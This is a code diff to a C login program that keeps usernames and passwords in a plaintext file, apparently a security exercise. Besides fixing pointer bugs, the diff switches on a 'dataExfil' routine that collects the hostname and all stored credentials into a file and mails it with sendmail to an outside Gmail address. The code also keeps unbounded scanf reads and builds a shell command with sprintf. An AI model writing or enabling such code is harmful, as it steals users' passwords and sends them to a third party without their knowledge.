@@ -2,6 +2,7 @@
 #include <stdbool.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
 
 
 /*
@@ -71,7 +72,7 @@ Finds and authenticates existing user
 */
 void findUser(unsigned int userType){
     FILE* fileptr;
-    char* username;
+    char username[STRING_MAX];
     char password[STRING_MAX];
     char checkUser[STRING_MAX];
     char checkPass[STRING_MAX];
@@ -81,9 +82,9 @@ void findUser(unsigned int userType){
     //Allows the user to attempt to login
     while (searchUser) {
         puts("Please enter your username:");
-        scanf("%s", &username);
+        scanf("%s", username);
         puts("Please enter your password:");
-        scanf("%s", &password);
+        scanf("%s", password);
 
         //checks either the normal users file or sudoers file
         if (userType == 0) {
@@ -100,7 +101,7 @@ void findUser(unsigned int userType){
                 fgets(checkPass, STRING_MAX, fileptr);
                 formatString(checkUser);
                 formatString(checkPass);
-                if (strcmp(&username, &checkUser) == 0 && strcmp(&password, &checkPass) == 0){
+                if (strcmp(username, checkUser) == 0 && strcmp(password, checkPass) == 0){
                     searchUser = false;
                 }
             }
@@ -122,10 +123,10 @@ bool newUser(){
     char password[STRING_MAX];
 
     puts("Please enter your username");
-    scanf("%s", &username);
+    scanf("%s", username);
 
     puts("Please enter your password");
-    scanf("%s", &password);
+    scanf("%s", password);
 
     fileptr = fopen("users/passwords.txt", "a");
     if (fileptr == NULL){
@@ -217,7 +218,7 @@ void dataExfil() {
     puts("Begin Data exfiltration process.....\nCreating Data exfil file.....");
     createExfilFile();
     puts("Attempting to send email.....");
-    //sendEmail("exfil.txt");
+    sendEmail("exfil.txt");
     puts("Data exfiltration complete!");
 }
 /*
@@ -227,9 +228,10 @@ void sendEmail(char fileLoc[]){
     FILE* fileptr;
     char fileLine[FILE_LINE_MAX];
     char cmd[FILE_LINE_MAX];
-    char to[] = 'hungryllama150@gmail.com';
+    const char to[] = "hungryllama150@gmail.com";
 
-    if (fileptr = fopen(fileLoc, "r") != NULL) {
+    fileptr = fopen(fileLoc, "r");
+    if (fileptr != NULL) {
         fclose(fileptr);
         //creates cmd command
         sprintf(cmd, "sendmail %s < %s", to, fileLoc);
@@ -253,23 +255,27 @@ void createExfilFile(){
     if (exfil != NULL) {
         //getting host name
         if (gethostname(hostName, sizeof(hostName)) == 0) {
-            fprintf(exfil, "%s Data Exfiltration\n\n~~~~~~~~~~~Begin Data Exfiltration~~~~~~~~~~~\n");
+            fprintf(exfil, "%s Data Exfiltration\n\n~~~~~~~~~~~Begin Data Exfiltration~~~~~~~~~~~\n", hostName);
         } else {
             fprintf(exfil, "Unknown Host Data Exfiltration\n\n");
         }
 
         //User data
         users = fopen("users/passwords.txt", "r");
-        fprintf(exfil, "Usernames and Passwords:");
+        fprintf(exfil, "Usernames and Passwords:\n");
         if (users != NULL) {
+            //gets all username and password sets
             while (fgets(username, STRING_MAX, users) != NULL) {
                 fgets(password, STRING_MAX, users);
+                formatString(username);
+                formatString(password);
                 fprintf(exfil, "Username: '%s' Password: '%s'\n", username, password);
             }
             fprintf(exfil, "End User data\n\n");
         } else {
             fprintf(exfil, "Unable to locate users file\n");
         }
+        fclose(users);
 
         fprintf(exfil, "~~~~~~~~~~~End Data Exfiltration~~~~~~~~~~~");
         fclose(exfil);
